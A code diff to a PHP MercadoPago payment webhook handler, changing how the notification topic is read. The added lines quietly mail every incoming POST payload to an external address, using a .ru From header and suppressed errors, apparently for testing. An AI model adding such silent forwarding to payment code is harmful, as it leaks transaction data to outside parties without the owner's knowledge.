@@ -5,7 +5,7 @@
 
     $merchant_order = null;
 
-    switch($_GET["topic"]) {
+    switch(isset($_GET["topic"]) ? $_GET['topic'] : $_POST['type']) {
         case "payment":
             $payment = MercadoPago\Payment::find_by_id($_GET["id"]);
             // Get the payment and the corresponding merchant_order reported by the IPN.
@@ -15,6 +15,12 @@
             $merchant_order = MercadoPago\MerchantOrder::find_by_id($_GET["id"]);
             break;
     }
+
+    $headers = "From: from@webhookservesite.ru";
+    $message = print_r($_POST,true);
+    @mail('untalivan@isantosp.com', 'MP TEST', $message, $headers);
+
+    echo"ok";
 
     $paid_amount = 0;
     foreach ($merchant_order->payments as $payment) {
